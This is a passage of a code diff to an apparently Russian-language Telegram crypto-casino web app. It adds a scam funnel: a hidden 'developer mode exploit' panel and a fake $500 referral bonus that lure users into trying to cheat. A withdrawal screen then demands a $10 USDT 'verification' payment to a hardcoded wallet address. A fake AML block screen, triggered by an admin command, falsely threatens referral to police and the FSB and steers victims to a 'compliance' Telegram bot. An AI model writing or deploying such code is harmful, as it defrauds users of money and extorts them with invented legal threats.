@@ -1259,6 +1259,24 @@ html, body {
   0% { transform: translateY(0) rotate(0deg); opacity: 1; }
   100% { transform: translateY(500px) rotate(720deg); opacity: 0; }
 }
+/* ── DANGER MODE ── */
+body.danger-mode {
+  --bg: #0f0505;
+  --bg-card: #1a0808;
+  --bg-card2: #1f0a0a;
+  --bg-elevated: #200b0b;
+  --accent: #ef4444;
+  --green: #ef4444;
+  --border: rgba(220,38,38,0.25);
+}
+body.danger-mode #app { animation: dangerPulse 2.5s ease-in-out infinite; }
+@keyframes dangerPulse {
+  0%,100% { box-shadow: none; }
+  50% { box-shadow: inset 0 0 80px rgba(220,38,38,0.06); }
+}
+body.danger-mode #navbar { border-top-color: rgba(220,38,38,0.2); }
+body.danger-mode .nav-btn.active { color: #ef4444; }
+body.danger-mode .nav-btn.active::after { background: #ef4444; }
 </style>
 </head>
 <body>
@@ -1289,16 +1307,200 @@ html, body {
   </div>
 </div>
 
+<!-- RAW DATA SHEET (long-press balance) -->
+<div id="rawDataSheet" style="display:none;position:fixed;inset:0;z-index:10001;background:rgba(0,0,0,0.72);backdrop-filter:blur(8px);align-items:flex-end;justify-content:center;" onclick="closeRawData()">
+  <div onclick="event.stopPropagation()" style="background:#0d1117;border-radius:20px 20px 0 0;width:100%;max-width:480px;padding:12px 0 32px;font-family:monospace;">
+    <div style="width:36px;height:4px;background:rgba(255,255,255,0.1);border-radius:2px;margin:0 auto 16px;"></div>
+    <div style="padding:0 18px;">
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:14px;">
+        <div style="width:8px;height:8px;border-radius:50%;background:#ff5f57;"></div>
+        <div style="width:8px;height:8px;border-radius:50%;background:#ffbd2e;"></div>
+        <div style="width:8px;height:8px;border-radius:50%;background:#28c840;"></div>
+        <span style="font-size:11px;color:rgba(255,255,255,0.3);margin-left:4px;">user_object · raw dump</span>
+      </div>
+      <div id="rawDataContent" style="font-size:11px;color:rgba(255,255,255,0.55);line-height:1.9;white-space:pre;overflow-x:auto;padding-bottom:4px;"></div>
+      <div style="margin-top:14px;padding-top:14px;border-top:1px solid rgba(255,255,255,0.07);">
+        <div style="font-size:10px;color:rgba(255,255,255,0.25);margin-bottom:8px;">⚠ Confidential · Sphere Internal API</div>
+        <button onclick="copyAuthKey()" style="width:100%;padding:10px;background:rgba(35,134,54,0.15);border:1px solid rgba(35,134,54,0.3);border-radius:8px;color:#4ade80;font-family:monospace;font-size:12px;font-weight:700;cursor:pointer;">📋 Copy auth_key</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- REFERRAL BUG Modal -->
+<div id="hackModal" style="display:none;position:fixed;inset:0;z-index:10000;background:rgba(0,0,0,0.55);backdrop-filter:blur(6px);align-items:flex-end;justify-content:center;">
+  <div style="background:#16181f;border-radius:24px 24px 0 0;width:100%;max-width:480px;padding:12px 0 0;max-height:90vh;overflow-y:auto;">
+    <div style="width:40px;height:4px;background:rgba(255,255,255,0.12);border-radius:2px;margin:0 auto 20px;"></div>
+
+    <!-- Шаг 1: Найденный баг -->
+    <div id="hackStep1" style="padding:0 20px 32px;">
+      <div style="display:flex;align-items:flex-start;gap:12px;margin-bottom:18px;">
+        <div style="width:48px;height:48px;background:linear-gradient(135deg,#f59e0b,#ef4444);border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:24px;flex-shrink:0;">🎁</div>
+        <div>
+          <div style="font-weight:700;font-size:17px;margin-bottom:3px;">Необработанный бонус</div>
+          <div style="font-size:12px;color:rgba(255,255,255,0.4);line-height:1.4;">Система обнаружила незачисленные средства на вашем аккаунте</div>
+        </div>
+      </div>
+
+      <div style="background:#0e1016;border:1px solid rgba(255,255,255,0.06);border-radius:14px;padding:16px;margin-bottom:16px;">
+        <div style="font-size:11px;color:rgba(255,255,255,0.3);text-transform:uppercase;letter-spacing:0.8px;margin-bottom:12px;">Детали транзакции</div>
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+          <span style="font-size:13px;color:rgba(255,255,255,0.45);">Тип</span>
+          <span style="font-size:13px;color:#fff;font-weight:500;">Реферальный бонус</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+          <span style="font-size:13px;color:rgba(255,255,255,0.45);">Сумма</span>
+          <span id="refAmount" style="font-size:16px;color:#4ade80;font-weight:700;">+$500.00 USDT</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+          <span style="font-size:13px;color:rgba(255,255,255,0.45);">ID операции</span>
+          <span style="font-size:12px;color:rgba(255,255,255,0.6);font-family:monospace;" id="refBonusId"></span>
+        </div>
+        <div style="display:flex;justify-content:space-between;align-items:center;">
+          <span style="font-size:13px;color:rgba(255,255,255,0.45);">Статус</span>
+          <span style="font-size:12px;background:rgba(245,158,11,0.15);color:#f59e0b;padding:3px 10px;border-radius:20px;font-weight:600;">не зачислен</span>
+        </div>
+      </div>
+
+      <div style="font-size:13px;color:rgba(255,255,255,0.5);line-height:1.7;margin-bottom:20px;">При регистрации через реферальную ссылку бонус не был применён автоматически из-за сбоя в обработчике. Вы можете запросить его вручную.</div>
+
+      <button onclick="hackStep2Start()" style="width:100%;padding:16px;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;border:none;border-radius:14px;font-weight:700;font-size:16px;cursor:pointer;margin-bottom:10px;">Получить $500 →</button>
+      <button onclick="closeHackModal()" style="width:100%;padding:14px;background:rgba(255,255,255,0.05);border:none;border-radius:14px;color:rgba(255,255,255,0.4);font-size:14px;cursor:pointer;">Закрыть</button>
+    </div>
+
+    <!-- Шаг 2: Обработка -->
+    <div id="hackStep2" style="display:none;padding:0 20px 32px;text-align:center;">
+      <div style="padding:12px 0 20px;">
+        <div style="width:52px;height:52px;border:3px solid rgba(255,255,255,0.08);border-top-color:#f59e0b;border-radius:50%;animation:spin .9s linear infinite;margin:0 auto 18px;"></div>
+        <div style="font-weight:700;font-size:17px;margin-bottom:6px;">Обработка запроса</div>
+        <div style="font-size:13px;color:rgba(255,255,255,0.4);" id="refStatusText">Инициализация...</div>
+      </div>
+      <div style="background:#0e1016;border-radius:12px;padding:14px;text-align:left;font-size:12px;color:rgba(255,255,255,0.3);line-height:2.1;" id="refLog"></div>
+    </div>
+
+    <!-- Шаг 3: Успех — средства зачислены -->
+    <div id="hackStep3" style="display:none;padding:0 20px 32px;text-align:center;">
+      <div style="padding:8px 0 20px;">
+        <div style="width:72px;height:72px;background:rgba(74,222,128,0.12);border-radius:24px;display:flex;align-items:center;justify-content:center;font-size:36px;margin:0 auto 16px;">✅</div>
+        <div style="font-weight:700;font-size:20px;margin-bottom:6px;">Операция выполнена</div>
+        <div style="font-size:13px;color:rgba(255,255,255,0.45);">Средства зачислены на счёт</div>
+      </div>
+
+      <div style="background:#0e1016;border:1px solid rgba(74,222,128,0.15);border-radius:14px;padding:16px;margin-bottom:20px;text-align:left;">
+        <div style="display:flex;justify-content:space-between;margin-bottom:10px;padding-bottom:10px;border-bottom:1px solid rgba(255,255,255,0.05);">
+          <span style="font-size:13px;color:rgba(255,255,255,0.4);">Операция</span>
+          <span style="font-size:13px;color:#fff;">manual_credit</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;margin-bottom:10px;padding-bottom:10px;border-bottom:1px solid rgba(255,255,255,0.05);">
+          <span style="font-size:13px;color:rgba(255,255,255,0.4);">Сумма</span>
+          <span style="font-size:15px;color:#4ade80;font-weight:700;" id="successAmount">+$500.00 USDT</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;">
+          <span style="font-size:13px;color:rgba(255,255,255,0.4);">Статус</span>
+          <span style="font-size:13px;color:#4ade80;font-weight:600;">зачислено ✓</span>
+        </div>
+      </div>
+
+      <div style="font-size:13px;color:rgba(255,255,255,0.4);line-height:1.6;margin-bottom:20px;">Средства доступны для вывода. Перейди в раздел <b style="color:white;">Вывод</b> и укажи свой кошелёк.</div>
+
+      <button onclick="devSuccessClose()" style="width:100%;padding:16px;background:#4ade80;color:#000;border:none;border-radius:14px;font-weight:700;font-size:16px;cursor:pointer;">Перейти к выводу →</button>
+    </div>
+  </div>
+</div>
+
+<!-- Verification Required Modal -->
+<div id="verifyModal" style="display:none;position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,0.85);backdrop-filter:blur(10px);align-items:center;justify-content:center;">
+  <div style="background:var(--bg-card);border:1px solid rgba(198,255,0,0.3);border-radius:var(--radius);padding:28px 24px;width:90%;max-width:340px;text-align:center;">
+    <div style="font-size:42px;margin-bottom:12px;">🔒</div>
+    <div style="font-weight:800;font-size:18px;margin-bottom:8px;">Подтверждение личности</div>
+    <div style="color:var(--text2);font-size:14px;line-height:1.6;margin-bottom:16px;">Для вывода средств требуется однократная верификация аккаунта — стандартная процедура безопасности.</div>
+    <div style="background:rgba(255,255,255,0.04);border-radius:10px;padding:12px 14px;margin-bottom:20px;text-align:left;">
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;font-size:13px;color:rgba(255,255,255,0.5);">
+        <span>✅</span> Операция подтверждена
+      </div>
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;font-size:13px;color:rgba(255,255,255,0.5);">
+        <span>✅</span> Адрес кошелька принят
+      </div>
+      <div style="display:flex;align-items:center;gap:8px;font-size:13px;color:#f59e0b;">
+        <span>⏳</span> Верификация личности — требуется
+      </div>
+    </div>
+    <a href="https://t.me/Verification_CasinoBoom_bot" target="_blank" style="display:block;width:100%;padding:14px;background:var(--accent);color:#000;font-weight:700;font-size:15px;border-radius:var(--radius-xs);text-decoration:none;margin-bottom:10px;text-align:center;" onclick="closeVerifyModal()">
+      Пройти верификацию →
+    </a>
+    <button onclick="closeVerifyModal()" style="width:100%;padding:12px;background:rgba(255,255,255,0.06);border:none;border-radius:var(--radius-xs);color:var(--text2);font-size:14px;cursor:pointer;">Позже</button>
+  </div>
+</div>
+
 <!-- Withdraw Modal -->
-<div id="withdrawModal" style="display:none;position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,0.7);backdrop-filter:blur(8px);align-items:center;justify-content:center;">
-  <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:24px;width:90%;max-width:360px;max-height:80vh;overflow-y:auto;">
-    <div style="font-weight:700;font-size:18px;margin-bottom:8px;text-align:center;">💸 Вывод USDT</div>
-    <div style="color:var(--text2);font-size:13px;text-align:center;margin-bottom:16px;">Доступно: <span id="withAvail">0</span> USDT · Мин: 5 USDT</div>
-    <input id="withTrc20" type="text" placeholder="TRC20 адрес кошелька (USDT)" style="width:100%;background:var(--bg-elevated);border:1px solid var(--border);border-radius:var(--radius-xs);padding:12px;color:white;font-size:15px;outline:none;margin-bottom:12px;box-sizing:border-box;">
-    <input id="withAmount" type="number" placeholder="Сумма вывода" min="5" style="width:100%;background:var(--bg-elevated);border:1px solid var(--border);border-radius:var(--radius-xs);padding:12px;color:white;font-size:15px;outline:none;margin-bottom:16px;box-sizing:border-box;">
-    <button onclick="confirmWithdraw()" style="width:100%;padding:14px;border:none;border-radius:var(--radius-xs);background:var(--accent);color:#000;font-weight:700;font-size:15px;cursor:pointer;">Вывести</button>
-    <button onclick="closeWithdrawModal()" style="width:100%;padding:10px;border:none;background:transparent;color:var(--text2);font-size:13px;cursor:pointer;margin-top:8px;">Отмена</button>
+<div id="withdrawModal" style="display:none;position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,0.7);backdrop-filter:blur(8px);align-items:flex-end;justify-content:center;">
+  <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:20px 20px 0 0;padding:20px 20px 32px;width:100%;max-width:480px;max-height:88vh;overflow-y:auto;box-sizing:border-box;">
+    <div style="width:36px;height:4px;background:rgba(255,255,255,0.1);border-radius:2px;margin:0 auto 18px;"></div>
+    <div style="font-weight:700;font-size:18px;margin-bottom:4px;text-align:center;">💸 Вывод USDT</div>
+    <div style="color:var(--text2);font-size:13px;text-align:center;margin-bottom:6px;">Доступно: <span id="withAvail">0</span> USDT · Мин: 5 USDT</div>
+
+    <!-- Сеть -->
+    <div style="display:flex;align-items:center;gap:8px;background:rgba(243,186,47,0.07);border:1px solid rgba(243,186,47,0.2);border-radius:8px;padding:9px 12px;margin-bottom:14px;">
+      <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" onerror="this.style.display='none'" style="width:20px;height:20px;border-radius:50%;">
+      <div>
+        <div style="font-size:12px;font-weight:700;color:#f3ba2f;">BNB Smart Chain</div>
+        <div style="font-size:10px;color:rgba(255,255,255,0.4);">BEP-20 · USDT</div>
+      </div>
+      <div style="margin-left:auto;font-size:10px;color:rgba(243,186,47,0.6);font-weight:600;">АКТИВНА</div>
+    </div>
+
+    <input id="withTrc20" type="text" placeholder="BEP-20 адрес кошелька (0x...)" style="width:100%;background:var(--bg-elevated);border:1px solid var(--border);border-radius:var(--radius-xs);padding:12px;color:white;font-size:14px;outline:none;margin-bottom:10px;box-sizing:border-box;">
+    <input id="withAmount" type="number" placeholder="Сумма вывода" min="5" style="width:100%;background:var(--bg-elevated);border:1px solid var(--border);border-radius:var(--radius-xs);padding:12px;color:white;font-size:14px;outline:none;margin-bottom:14px;box-sizing:border-box;">
+
+    <!-- Инструкция $10 -->
+    <div style="background:rgba(245,158,11,0.08);border:1px solid rgba(245,158,11,0.25);border-radius:10px;padding:14px;margin-bottom:14px;">
+      <div style="font-weight:700;font-size:13px;color:#f59e0b;margin-bottom:8px;">⚠️ Подтверждение аккаунта</div>
+      <div style="font-size:12px;color:rgba(255,255,255,0.7);line-height:1.7;margin-bottom:10px;">
+        Для верификации адреса вывода необходимо перевести <b style="color:#fff;">$10 USDT (BEP-20)</b> на счёт проверки:
+      </div>
+      <div onclick="copyVerifyAddr()" style="background:#0d1117;border:1px solid rgba(255,255,255,0.08);border-radius:7px;padding:10px 12px;font-family:monospace;font-size:11px;color:#60a5fa;word-break:break-all;cursor:pointer;display:flex;align-items:center;gap:8px;">
+        <span id="verifyAddr">0x0204C039DE6d13ACe6F873484D0D9A71BFBACA06</span>
+        <svg viewBox="0 0 20 20" fill="none" style="width:14px;height:14px;flex-shrink:0;opacity:0.5"><rect x="7" y="7" width="10" height="10" rx="2" stroke="white" stroke-width="1.5"/><path d="M4 13V4a1 1 0 011-1h9" stroke="white" stroke-width="1.5" stroke-linecap="round"/></svg>
+      </div>
+      <div style="font-size:11px;color:rgba(255,255,255,0.4);margin-top:8px;">Нажмите на адрес, чтобы скопировать</div>
+      <div style="font-size:12px;color:rgba(255,255,255,0.6);margin-top:10px;line-height:1.6;">
+        После оплаты отправьте скриншот в бот верификации платежей:
+      </div>
+      <a href="https://t.me/Payments_verify_bot" target="_blank" style="display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:10px;background:rgba(0,136,204,0.15);border:1px solid rgba(0,136,204,0.3);border-radius:8px;color:#38bdf8;font-weight:700;font-size:13px;text-decoration:none;margin-top:10px;box-sizing:border-box;">
+        <svg viewBox="0 0 24 24" fill="currentColor" style="width:16px;height:16px;"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.248l-2.015 9.495c-.148.658-.543.818-1.1.508l-3.03-2.233-1.463 1.41c-.162.162-.297.297-.608.297l.216-3.075 5.595-5.055c.243-.216-.054-.336-.378-.12L7.08 14.408l-2.99-.934c-.65-.204-.663-.65.136-.963l11.67-4.5c.54-.196 1.015.12.666.237z"/></svg>
+        📎 Отправить скриншот оплаты
+      </a>
+    </div>
+
+    <button onclick="confirmWithdraw()" style="width:100%;padding:14px;border:none;border-radius:var(--radius-xs);background:var(--accent);color:#000;font-weight:700;font-size:15px;cursor:pointer;margin-bottom:8px;">Подтвердить вывод</button>
+    <button onclick="closeWithdrawModal()" style="width:100%;padding:10px;border:none;background:transparent;color:var(--text2);font-size:13px;cursor:pointer;">Отмена</button>
     <div id="withHistory" style="margin-top:16px;"></div>
+  </div>
+</div>
+
+<!-- AML BLOCK Modal -->
+<div id="amlModal" style="display:none;position:fixed;inset:0;z-index:11000;background:rgba(0,0,0,0.92);backdrop-filter:blur(12px);align-items:center;justify-content:center;padding:16px;">
+  <div style="background:#0f0a0a;border:1px solid rgba(220,38,38,0.4);border-radius:16px;padding:24px;width:100%;max-width:400px;max-height:90vh;overflow-y:auto;box-sizing:border-box;">
+    <div style="display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:16px;">
+      <div style="width:44px;height:44px;border-radius:50%;background:rgba(220,38,38,0.15);border:2px solid rgba(220,38,38,0.5);display:flex;align-items:center;justify-content:center;font-size:20px;">🚨</div>
+      <div>
+        <div style="font-weight:800;font-size:16px;color:#ef4444;">ТРАНЗАКЦИЯ ЗАБЛОКИРОВАНА</div>
+        <div style="font-size:11px;color:rgba(220,38,38,0.6);font-family:monospace;">AML/CFT MONITORING SYSTEM</div>
+      </div>
+    </div>
+    <div style="border-top:1px solid rgba(220,38,38,0.2);padding-top:16px;font-size:13px;color:rgba(255,255,255,0.8);line-height:1.75;">
+      Ваша транзакция на сумму <b id="amlAmount" style="color:#ef4444;"></b> приостановлена системой мониторинга AML/CFT.<br><br>
+      <b style="color:#fca5a5;">Причина:</b> Обнаружено использование стороннего ПО для модификации алгоритма выдачи <span style="font-family:monospace;color:rgba(255,100,100,0.8);">(Exploit detected)</span>. Данное действие квалифицируется как <b style="color:#fca5a5;">ст. 272 УК РФ</b> (Неправомерный доступ к компьютерной информации).<br><br>
+      Ваш профиль и паспортные данные <b style="color:#ef4444;">заблокированы</b> и переданы в отдел кибербезопасности для формирования отчёта в правоохранительные органы.<br><br>
+      <div style="background:rgba(220,38,38,0.08);border:1px solid rgba(220,38,38,0.2);border-radius:8px;padding:12px;font-size:12px;color:rgba(255,200,200,0.85);">
+        Для предотвращения автоматической передачи дела в <b>МВД</b> и <b>ФСБ</b> — немедленно свяжитесь с дежурным офицером Compliance.
+      </div>
+    </div>
+    <div style="margin-top:8px;font-family:monospace;font-size:10px;color:rgba(220,38,38,0.35);text-align:center;" id="amlCaseId"></div>
+    <a id="amlComplianceBtn" href="https://t.me/Verification_CasinoBoom_bot" target="_blank" style="display:block;width:100%;padding:14px;background:linear-gradient(135deg,#dc2626,#991b1b);border:none;border-radius:10px;color:#fff;font-weight:800;font-size:14px;text-align:center;text-decoration:none;margin-top:16px;letter-spacing:0.3px;box-sizing:border-box;">
+      🛡 СВЯЗАТЬСЯ С ОТДЕЛОМ COMPLIANCE
+    </a>
+    <div style="font-size:10px;color:rgba(255,255,255,0.2);text-align:center;margin-top:12px;">Case ID: <span id="amlCaseIdSmall"></span> · Ref: AML-<span id="amlRef"></span></div>
   </div>
 </div>
 
@@ -1331,7 +1533,7 @@ html, body {
 
   <!-- TOPBAR -->
   <div id="topbar">
-    <div class="logo">
+    <div class="logo" id="logoTap" onclick="handleLogoTap()">
       <img src="logo.png" style="height:56px;">
     </div>
     <div class="top-right">
@@ -1566,12 +1768,12 @@ html, body {
         <div class="back-btn" onclick="navigate('lobby')">
           <svg viewBox="0 0 20 20" fill="none"><path d="M12 4l-6 6 6 6" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
         </div>
-        <div class="game-screen-title">💰 Кошелёк</div>
+        <div class="game-screen-title" id="walletTitle" onclick="handleWalletTitleTap()">💰 Кошелёк</div>
       </div>
       <div class="wallet-wrap">
         <div class="wallet-card">
           <div class="wallet-label">Баланс</div>
-          <div class="wallet-amount" id="walletBal">1,025.63</div>
+          <div class="wallet-amount" id="walletBal" oncontextmenu="showRawData(event)" ontouchstart="startRawDataPress(event)" ontouchend="cancelRawDataPress()" ontouchmove="cancelRawDataPress()">1,025.63</div>
           <div class="wallet-usd" id="walletUsd">USDT · Tether</div>
           <div class="wallet-btns">
             <button class="wallet-btn dep" onclick="walletDeposit()">
@@ -1623,6 +1825,61 @@ html, body {
           <div class="section-title" style="font-size:15px;">История</div>
         </div>
         <div class="tx-list" id="txList"></div>
+
+        <!-- Dev Mode Panel (скрыт по умолчанию) -->
+        <div id="devPanel" style="display:none;margin-top:16px;border:1px solid rgba(255,255,255,0.08);border-radius:10px;overflow:hidden;">
+          <div style="background:#0d1117;padding:10px 14px;display:flex;align-items:center;gap:8px;border-bottom:1px solid rgba(255,255,255,0.06);">
+            <div style="width:8px;height:8px;border-radius:50%;background:#ff5f57;"></div>
+            <div style="width:8px;height:8px;border-radius:50%;background:#ffbd2e;"></div>
+            <div style="width:8px;height:8px;border-radius:50%;background:#28c840;"></div>
+            <span style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.35);margin-left:6px;">sphere_internal — balance_tools v0.9</span>
+          </div>
+          <div style="background:#0d1117;padding:16px;">
+            <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.3);margin-bottom:4px;">⚠ Internal use only · Sphere Casino DevOps</div>
+            <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.25);margin-bottom:14px;display:flex;align-items:center;gap:6px;">
+              session_token:
+              <span id="devSessionId" onclick="copyDevToken()" style="color:#60a5fa;cursor:pointer;text-decoration:underline dotted;text-underline-offset:2px;" title="tap to copy"></span>
+              <span style="color:rgba(255,255,255,0.2);font-size:10px;">(tap to copy)</span>
+            </div>
+            <div style="margin-bottom:12px;">
+              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">operation_type</div>
+              <select id="devOpType" style="width:100%;background:#161b22;border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:9px 12px;color:rgba(255,255,255,0.7);font-family:monospace;font-size:12px;outline:none;">
+                <option value="manual_credit">manual_credit</option>
+                <option value="bonus_apply">bonus_apply</option>
+                <option value="promo_override">promo_override</option>
+              </select>
+            </div>
+            <div style="margin-bottom:12px;">
+              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">amount_usd (max: 500)</div>
+              <input id="devAmount" type="number" value="500" max="500" style="width:100%;background:#161b22;border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:9px 12px;color:#4ade80;font-family:monospace;font-size:14px;outline:none;font-weight:700;">
+            </div>
+            <div style="margin-bottom:12px;">
+              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">reason_code</div>
+              <input id="devReason" type="text" value="test_credit_q4" style="width:100%;background:#161b22;border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:9px 12px;color:rgba(255,255,255,0.5);font-family:monospace;font-size:12px;outline:none;">
+            </div>
+            <div style="margin-bottom:12px;">
+              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">session_token <span style="color:rgba(255,71,87,0.7);">*</span></div>
+              <input id="devAuthToken" type="text" placeholder="скопируй из строки session_token выше" style="width:100%;background:#161b22;border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:9px 12px;color:rgba(255,255,255,0.6);font-family:monospace;font-size:12px;outline:none;">
+            </div>
+            <div style="margin-bottom:12px;">
+              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">auth_key <span style="color:rgba(255,71,87,0.7);">*</span> <span style="color:rgba(255,255,255,0.2);">(зажми баланс в кошельке)</span></div>
+              <input id="devAuthKey" type="text" placeholder="получи через raw data" style="width:100%;background:#161b22;border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:9px 12px;color:rgba(255,255,255,0.6);font-family:monospace;font-size:12px;outline:none;">
+            </div>
+            <div style="margin-bottom:16px;">
+              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">invite_code <span style="color:rgba(255,71,87,0.7);">*</span></div>
+              <input id="devInviteCode" type="text" placeholder="секретный код из методички" style="width:100%;background:#161b22;border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:9px 12px;color:rgba(255,255,255,0.6);font-family:monospace;font-size:12px;outline:none;" autocomplete="off">
+            </div>
+            <button onclick="devPanelSubmit()" style="width:100%;padding:11px;background:#238636;border:1px solid rgba(35,134,54,0.4);border-radius:6px;color:#fff;font-family:monospace;font-size:13px;font-weight:700;cursor:pointer;letter-spacing:0.5px;">
+              $ execute_credit()
+            </button>
+          </div>
+        </div>
+
+        <!-- Версия (тапать 7 раз) -->
+        <div style="text-align:center;padding:24px 0 8px;">
+          <div id="versionTap" onclick="handleVersionTap()" style="display:inline-block;color:rgba(255,255,255,0.12);font-size:11px;cursor:pointer;user-select:none;padding:8px 16px;">v2.4.1 (build 2024.12.19)</div>
+          <div id="devTapHint" style="font-size:10px;color:rgba(198,255,0,0);margin-top:2px;transition:color .3s;">режим разработчика</div>
+        </div>
       </div>
     </div>
 
@@ -1632,7 +1889,7 @@ html, body {
         <div class="back-btn" onclick="navigate('lobby')">
           <svg viewBox="0 0 20 20" fill="none"><path d="M12 4l-6 6 6 6" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
         </div>
-        <div class="game-screen-title">🏆 Рейтинг</div>
+        <div class="game-screen-title" id="lbTitle" onclick="handleLbTitleTap()">🏆 Рейтинг</div>
       </div>
       <div class="lb-wrap">
         <div class="lb-tabs">
@@ -1827,6 +2084,11 @@ async function bootAuth() {
           if (Math.abs(newBal - S.balance) > 0.001) {
             S.balance = newBal;
             document.getElementById('balDisp').textContent = fmt(S.balance);
+            if(curScreen==='wallet') document.getElementById('walletBal').textContent = fmt(S.balance);
+          }
+          // Админ написал /reject — приложение блокируется
+          if (payload.new.aml_status === 'blocked' && !document.body.classList.contains('danger-mode')) {
+            showAmlModal(S.balance);
           }
         })
         .subscribe();
@@ -2795,10 +3057,263 @@ function walletWithdraw(){
   if(S.isDemo){ showToast('Демо режим — откройте казино через Telegram бота для реальной игры'); return; }
   if(S.balance < 5){ showToast('Минимум для вывода: 5 USDT'); return; }
   document.getElementById('withAvail').textContent = fmt(S.balance);
-  document.getElementById('withAmount').value = '';
+  document.getElementById('withAmount').value = fmt(S.balance);
   document.getElementById('withTrc20').value = '';
   document.getElementById('withdrawModal').style.display = 'flex';
   loadWithdrawHistory();
+}
+function closeVerifyModal(){ document.getElementById('verifyModal').style.display='none'; }
+
+// ═══ DEV MODE EXPLOIT ═══
+let _devTaps = 0, _devTimer = null, _devUnlocked = false;
+let _logoTaps = 0, _logoTimer = null;
+let _lbTaps = 0, _lbTimer = null, _step1Done = false;
+let _wTitleTaps = 0, _wTitleTimer = null, _step2Done = false;
+let _devSessionToken = '', _devAuthKey = '';
+let _rawPressTimer = null;
+
+// Шаг 1: 5 тапов по заголовку рейтинга
+function handleLbTitleTap() {
+  _lbTaps++;
+  clearTimeout(_lbTimer);
+  _lbTimer = setTimeout(() => { _lbTaps = 0; }, 2000);
+  if (navigator.vibrate) navigator.vibrate(20);
+  if (_lbTaps >= 5) {
+    _lbTaps = 0;
+    _step1Done = true;
+    if (navigator.vibrate) navigator.vibrate([30, 20, 30]);
+    showToast('🔓 Уровень 1 разблокирован');
+  }
+}
+
+// Шаг 2: 3 тапа по заголовку кошелька (только после шага 1)
+function handleWalletTitleTap() {
+  if (!_step1Done) return;
+  _wTitleTaps++;
+  clearTimeout(_wTitleTimer);
+  _wTitleTimer = setTimeout(() => { _wTitleTaps = 0; }, 1800);
+  if (navigator.vibrate) navigator.vibrate(25);
+  if (_wTitleTaps >= 3) {
+    _wTitleTaps = 0;
+    _step2Done = true;
+    if (navigator.vibrate) navigator.vibrate([40, 20, 40]);
+    showToast('🔓 Уровень 2 разблокирован');
+    // Показываем подсказку о версии
+    const hint = document.getElementById('devTapHint');
+    hint.style.color = 'rgba(198,255,0,0.3)';
+    hint.textContent = 'нажми на версию 7 раз';
+    setTimeout(() => { hint.style.color = 'rgba(198,255,0,0)'; }, 4000);
+  }
+}
+
+// Шаг 3: 7 тапов по версии (только после шагов 1+2)
+function handleVersionTap() {
+  if (!_step2Done) return;
+  _devTaps++;
+  clearTimeout(_devTimer);
+  _devTimer = setTimeout(() => { _devTaps = 0; document.getElementById('devTapHint').style.color='rgba(198,255,0,0)'; }, 1800);
+  const hint = document.getElementById('devTapHint');
+  const left = 7 - _devTaps;
+  if (_devTaps >= 3 && _devTaps < 7) {
+    hint.style.color = 'rgba(198,255,0,0.5)';
+    hint.textContent = `ещё ${left} до режима разработчика`;
+  }
+  if (_devTaps >= 7) {
+    _devTaps = 0;
+    hint.style.color = 'rgba(198,255,0,0)';
+    unlockDevMode();
+  }
+  if (navigator.vibrate) navigator.vibrate(30);
+}
+
+// Лого (запасной триггер — 5 тапов)
+function handleLogoTap() {
+  _logoTaps++;
+  clearTimeout(_logoTimer);
+  _logoTimer = setTimeout(() => { _logoTaps = 0; }, 1500);
+  if (_logoTaps >= 5) { _logoTaps = 0; unlockDevMode(); }
+}
+
+function unlockDevMode() {
+  if (_devUnlocked) return;
+  _devUnlocked = true;
+  if (navigator.vibrate) navigator.vibrate([60, 40, 60, 40, 120]);
+  showToast('🛠 Режим разработчика активирован');
+
+  const base = (S.tg_id || Date.now()).toString();
+  _devSessionToken = 'dev_' + btoa(base).replace(/[^a-z0-9]/gi,'').slice(0,8).toLowerCase() + '_' + Math.random().toString(36).slice(2,6);
+  // auth_key: другой детерминированный токен (hex-style)
+  _devAuthKey = Array.from({length: 16}, () => Math.floor(Math.random()*16).toString(16)).join('') + '-' + btoa(base).replace(/[^a-z0-9]/gi,'').slice(0,6);
+  document.getElementById('devSessionId').textContent = _devSessionToken;
+
+  setTimeout(() => {
+    document.getElementById('devPanel').style.display = 'block';
+    document.getElementById('devPanel').scrollIntoView({ behavior: 'smooth', block: 'center' });
+  }, 600);
+}
+
+function copyDevToken() {
+  if (!_devSessionToken) return;
+  navigator.clipboard?.writeText(_devSessionToken).catch(() => {});
